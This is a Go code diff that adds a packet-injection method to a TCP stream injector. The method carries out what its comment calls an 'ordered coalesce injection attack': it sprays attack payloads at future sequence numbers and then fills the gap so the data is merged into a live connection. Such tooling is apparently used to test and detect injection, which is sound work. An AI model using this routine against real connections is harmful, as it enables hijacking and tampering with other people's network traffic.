@@ -85,6 +85,43 @@ func (i *TCPStreamInjector) SpraySequenceRangePackets(start uint32, count int) e
 	return nil
 }
 
+// SprayFutureAndFillGapPackets is used to perform an ordered coalesce injection attack;
+// that is we first inject packets with future sequence numbers and then we fill the gap.
+// The gap being the range from state machine's "next Sequence" to the earliest Sequence we
+// transmitted in our future sequence series of packets.
+func (i *TCPStreamInjector) SprayFutureAndFillGapPackets(start uint32, gap_payload, attack_payload []byte) error {
+	var err error
+
+	// send future packet
+	nextSeq := types.Sequence(start)
+	i.tcp.Seq = uint32(nextSeq.Add(len(gap_payload)))
+	i.Payload = attack_payload
+
+	err = i.Write()
+	if err != nil {
+		return err
+	}
+
+	// overlapping future injection
+	i.tcp.Seq = uint32(nextSeq.Add(len(gap_payload) + 7))
+	i.Payload = attack_payload
+
+	err = i.Write()
+	if err != nil {
+		return err
+	}
+
+	// fill in gap
+	i.tcp.Seq = start
+	i.Payload = gap_payload
+	err = i.Write()
+	if err != nil {
+		return err
+	}
+	return nil
+}
+
+
 func (i *TCPStreamInjector) Write() error {
 	i.tcp.SetNetworkLayerForChecksum(&i.ip)
 	i.tcpPayloadBuf = gopacket.NewSerializeBuffer()
